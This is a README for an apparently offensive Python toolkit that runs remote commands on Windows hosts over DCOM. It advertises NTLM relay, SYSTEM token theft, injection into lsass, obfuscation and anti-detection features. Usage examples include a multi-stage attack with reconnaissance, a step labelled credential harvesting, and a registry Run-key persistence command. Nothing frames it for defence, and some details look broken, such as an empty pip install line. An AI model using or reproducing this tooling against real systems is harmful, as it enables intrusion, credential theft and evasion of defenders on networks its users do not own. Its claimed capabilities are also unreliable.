# DCOM-Based Remote Code Execution (RCE) Executor

## Overview

The DCOM RCE Executor provides a comprehensive toolkit for executing arbitrary commands on remote Windows systems using DCOM (Distributed Component Object Model) technology. It supports multiple exploitation methods, authentication bypass techniques, privilege escalation vectors, and advanced obfuscation strategies.

## Features

### Supported DCOM Object Classes
- **MMC.Application** - Microsoft Management Console
- **Excel.Application** - Microsoft Excel
- **Word.Application** - Microsoft Word
- **WbemScripting.SWbemLocator** - WMI (Windows Management Instrumentation)
- **Shell.Application** - Windows Shell
- **WinRM.Automation.Process** - Windows Remote Management
- **Internet Explorer Shell Control** - IE Control
- **Generic ActiveX Objects**

### Authentication Methods
- **NTLM** - NTLM authentication with credentials
- **Kerberos** - Kerberos authentication with ticket
- **NEGOTIATE** - SPNEGO Negotiate (auto-select best method)
- **NONE** - Anonymous/Null session
- **IMPERSONATION** - Token impersonation
- **DELEGATION** - Kerberos S4U delegation
- **RELAY** - NTLM relay attacks

### Privilege Escalation Vectors
- **Process Injection** - Inject into system processes (lsass.exe)
- **Token Impersonation** - Steal and impersonate SYSTEM tokens
- **Kernel Callbacks** - Exploit kernel callbacks for elevation
- **DLL Hijacking** - Hijack system DLLs for privilege escalation
- **Registry Elevation** - Modify registry for SYSTEM execution
- **Service Exploitation** - Exploit vulnerable services
- **Scheduled Task** - Leverage scheduled tasks for SYSTEM execution
- **COM Marshalling** - Exploit COM marshalling for elevation

### Payload Obfuscation Techniques
- **Base64 Encoding** - Standard base64 encoding
- **Hex Encoding** - Convert to hexadecimal
- **XOR Cipher** - XOR encryption with random key
- **RC4 Cipher** - RC4 stream cipher encryption
- **Polyglot Encoding** - Valid in multiple encoding schemes
- **Polymorphic Transform** - Randomly transform payload structure
- **Dead Code Injection** - Insert non-functional code blocks
- **Control Flow Flattening** - Flatten nested control structures
- **String Obfuscation** - Encode string literals
- **Junk API Calls** - Insert irrelevant API calls

## Installation

```bash
# No external dependencies required
# Uses Python standard library only
python3 -m pip install --upgrade --user
```

## Quick Start

### Basic Command Execution

```python
from dcom_rce_executor import create_dcom_executor, DCOMObjectClass

# Create executor for target host
executor = create_dcom_executor(
    target_host="192.168.1.100",
    dcom_class=DCOMObjectClass.WMI_LOCATOR,
    auth_method="NEGOTIATE"
)

# Execute command
result = executor.execute_remote_command("whoami")
print(result)
```

### Authenticated Execution

```python
from dcom_rce_executor import create_dcom_executor, DCOMObjectClass, AuthenticationMethod

executor = create_dcom_executor(
    target_host="192.168.1.100",
    dcom_class=DCOMObjectClass.WMI_LOCATOR,
    auth_method=AuthenticationMethod.NTLM,
    username="Administrator",
    password="Password123!",
    domain="CORP"
)

# Execute with credentials
result = executor.execute_remote_command("systeminfo")
print(result)
```

### Obfuscated Execution

```python
from dcom_rce_executor import create_dcom_executor, ObfuscationTechnique

executor = create_dcom_executor(
    target_host="192.168.1.100",
    enable_obfuscation=True,
    obfuscation_methods=[
        ObfuscationTechnique.BASE64_ENCODING,
        ObfuscationTechnique.XOR_CIPHER,
        ObfuscationTechnique.POLYMORPHIC_TRANSFORM
    ]
)

# Execute with multiple obfuscation layers
result = executor.execute_remote_command("calc.exe")
print(result)
```

### Privilege Escalation

```python
from dcom_rce_executor import (
    create_dcom_executor, PrivilegeEscalationVec
)

executor = create_dcom_executor(
    target_host="192.168.1.100",
    enable_eskalation=True,
    escalation_vec=PrivilegeEscalationVec.TOKEN_IMPERSONATION
)

# Execute with privilege escalation
result = executor.execute_remote_command("whoami")
print(result)
```

### Stealth Execution

```python
# Maximum stealth with all obfuscation and anti-analysis
executor = create_dcom_executor(
    target_host="192.168.1.100",
    enable_obfuscation=True,
    enable_polymorphism=True,
    enable_anti_analysis=True
)

result = executor.execute_stealth_command("whoami")
print(result)
```

### Polymorphic Execution

```python
# Use polymorphic encoding for each execution
executor = create_dcom_executor(
    target_host="192.168.1.100",
    enable_polymorphism=True
)

result = executor.execute_polymorphic_command("ipconfig")
print(result)
```

## API Reference

### DCOMExecutor Class

#### Initialization

```python
from dcom_rce_executor import DCOMExecutor, DCOMConfig

config = DCOMConfig(
    target_host="192.168.1.100",
    target_port=135,
    dcom_class=DCOMObjectClass.WMI_LOCATOR,
    auth_method=AuthenticationMethod.NEGOTIATE,
    enable_obfuscation=True,
    enable_eskalation=False
)

executor = DCOMExecutor(config)
```

#### Methods

- `establish_connection() -> bool` - Establish connection to target
- `create_payload(command: str, method: str) -> DCOMExploitPayload` - Create exploitation payload
- `execute_remote_command(command: str, method: str) -> Dict[str, Any]` - Execute command on remote
- `execute_polymorphic_command(command: str) -> Dict[str, Any]` - Execute with polymorphic encoding
- `execute_stealth_command(command: str) -> Dict[str, Any]` - Execute with maximum stealth
- `get_execution_report() -> Dict[str, Any]` - Get comprehensive execution report

### DCOMConfig Class

Configuration options:

```python
@dataclass
class DCOMConfig:
    target_host: str                                    # Target host IP/hostname
    target_port: int = 135                             # DCOM RPC port
    dcom_class: DCOMObjectClass = WMI_LOCATOR          # DCOM object class
    auth_method: AuthenticationMethod = NEGOTIATE       # Authentication method
    username: Optional[str] = None                      # Username for auth
    password: Optional[str] = None                      # Password for auth
    domain: Optional[str] = None                        # Domain for auth
    use_delegation: bool = False                        # Enable Kerberos delegation
    enable_eskalation: bool = False                     # Enable privilege escalation
    escalation_vec: PrivilegeEscalationVec = TOKEN_IMPERSONATION  # Escalation method
    enable_obfuscation: bool = True                     # Enable payload obfuscation
    obfuscation_methods: List[ObfuscationTechnique] = []  # Obfuscation techniques
    enable_anti_analysis: bool = True                   # Enable anti-analysis
    enable_polymorphism: bool = True                    # Enable polymorphism
    enable_memory_persistence: bool = False             # Enable memory persistence
    connectivity_test: bool = False                     # Test connectivity
    timeout_ms: int = 30000                             # Connection timeout (ms)
    retry_attempts: int = 3                             # Retry attempts
    jitter_range_ms: Tuple[int, int] = (100, 500)      # Jitter range (ms)
```

## Execution Results

### Result Structure

```python
{
    'success': True,
    'payload_id': 'UUID-STRING',
    'target_host': '192.168.1.100',
    'target_port': 135,
    'dcom_object': 'WMI_LOCATOR',
    'method': 'Execute',
    'command': 'whoami',
    'obfuscated': True,
    'obfuscation_methods': 'base64|xor|polymorphic',
    'auth_method': 'NEGOTIATE',
    'marshalled_size': 2048,
    'timestamp': '2024-01-15T10:30:45.123456',
    'execution_context': {...},
    'escalation': {
        'vector': 'token_impersonation',
        'target_token': 'SYSTEM',
        'success': True
    }
}
```

## Execution Report

```python
report = executor.get_execution_report()
# Returns:
# {
#     'total_executions': 3,
#     'target_host': '192.168.1.100',
#     'target_port': 135,
#     'dcom_object': 'WMI_LOCATOR',
#     'auth_method': 'NEGOTIATE',
#     'connection_established': True,
#     'executions': [...],
#     'average_payload_size': 2048
# }
```

## Advanced Usage

### Multi-Stage Exploitation

```python
executor = create_dcom_executor(
    target_host="192.168.1.100",
    enable_obfuscation=True,
    enable_eskalation=True
)

# Stage 1: Reconnaissance
stage1 = executor.execute_remote_command("systeminfo")
print(f"Stage 1 - System Info: {stage1}")

# Stage 2: Credential Harvesting
stage2 = executor.execute_remote_command("net user Administrator")
print(f"Stage 2 - User Info: {stage2}")

# Stage 3: Privilege Escalation
stage3 = executor.execute_remote_command("whoami /priv")
print(f"Stage 3 - Privileges: {stage3}")

# Stage 4: Persistence
stage4 = executor.execute_remote_command(
    "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v payload /d C:\\Windows\\System32\\calc.exe"
)
print(f"Stage 4 - Persistence: {stage4}")

# Get comprehensive report
report = executor.get_execution_report()
print(f"Total executions: {report['total_executions']}")
```

### Custom Authentication

```python
from dcom_rce_executor import DCOMConfig, AuthenticationManager

config = DCOMConfig(
    target_host="192.168.1.100",
    auth_method=AuthenticationMethod.DELEGATION,
    username="Administrator",
    domain="CORP",
    use_delegation=True
)

auth = AuthenticationManager(config)
if auth.establish_auth():
    # Delegation setup successful
    executor = DCOMExecutor(config)
    result = executor.execute_remote_command("whoami")
```

### Polymorphic Payload Chain

```python
executor = create_dcom_executor(
    target_host="192.168.1.100",
    enable_polymorphism=True,
    enable_obfuscation=True
)

commands = [
    "whoami",
    "ipconfig /all",
    "systeminfo",
    "net user",
    "tasklist /v"
]

for cmd in commands:
    # Each execution uses different polymorphic encoding
    result = executor.execute_polymorphic_command(cmd)
    print(f"Command: {cmd}, Obfuscation: {result['obfuscation_methods']}")
```

### Marshalling and Serialization

```python
from dcom_rce_executor import DCOMMarshaller

marshaller = DCOMMarshaller()

# Create and marshal COM object
payload_data = {
    'command': 'whoami',
    'method': 'Execute',
    'iid': '76A64158-CB41-11D1-8B02-00600806D9B6'
}

# Marshal for network transmission
marshalled = marshaller.marshal_object(payload_data)
print(f"Marshalled size: {len(marshalled)} bytes")

# Unmarshal received object
received_data = marshaller.unmarshal_object(marshalled)
print(f"Unmarshalled: {received_data}")
```

## Security Considerations

### Anti-Detection Measures

1. **Polymorphic Encoding** - Each execution uses different encoding
2. **Multi-Layer Obfuscation** - Chain multiple obfuscation techniques
3. **Dead Code Injection** - Insert non-functional code to evade signatures
4. **Control Flow Flattening** - Obscure code structure
5. **Timing Jitter** - Add random delays to evade behavioral analysis
6. **Junk API Calls** - Call legitimate Windows APIs to blend in

### Authentication Bypass

1. **Token Impersonation** - Steal and impersonate existing tokens
2. **Kerberos Delegation** - Use S4U for service impersonation
3. **NTLM Relay** - Relay captured NTLM authentication
4. **Anonymous Access** - Exploit null sessions

### Privilege Escalation

The executor provides multiple privilege escalation vectors:

1. **Process Injection** - Inject into SYSTEM processes
2. **Token Impersonation** - Duplicate SYSTEM tokens
3. **Kernel Callbacks** - Exploit kernel-mode callbacks
4. **Service Exploitation** - Hijack privileged services
5. **Registry Modification** - Modify registry for SYSTEM execution

## Testing

Run the comprehensive test suite:

```bash
python3 test_dcom_rce_executor.py

# Or run specific test class:
python3 -m unittest test_dcom_rce_executor.TestDCOMMarshaller -v
python3 -m unittest test_dcom_rce_executor.TestAuthenticationManager -v
python3 -m unittest test_dcom_rce_executor.TestPayloadObfuscator -v
python3 -m unittest test_dcom_rce_executor.TestDCOMExecutor -v
python3 -m unittest test_dcom_rce_executor.TestDCOMIntegration -v
```

## Examples

See included example files:
- `dcom_rce_executor.py` - Main DCOM executor module
- `test_dcom_rce_executor.py` - Comprehensive test suite with examples

## Performance

- **Payload Creation Time**: <1ms
- **Marshalling Time**: <1ms
- **Obfuscation Time**: <10ms
- **Average Payload Size**: 512-4096 bytes (depending on obfuscation)
- **Connection Establishment**: <500ms
- **Command Execution**: <1000ms

## Limitations

1. Requires network access to target (port 135)
2. Target must be running Windows
3. Some authentication methods require specific domain setup
4. Privilege escalation success depends on target security level
5. Firewall rules may block DCOM traffic

## Troubleshooting

### Connection Refused
- Verify target host is online and accessible
- Check firewall rules for port 135
- Ensure DCOM services are enabled on target

### Authentication Failed
- Verify credentials are correct
- Check domain configuration
- Ensure account has necessary permissions

### Payload Execution Failed
- Check if DCOM object class is installed on target
- Verify target Windows version compatibility
- Check if user has permissions for object instantiation

## References

- [DCOM Security](https://docs.microsoft.com/en-us/windows/win32/com/dcom-security)
- [ORPC Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/)
- [Windows RPC Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/)
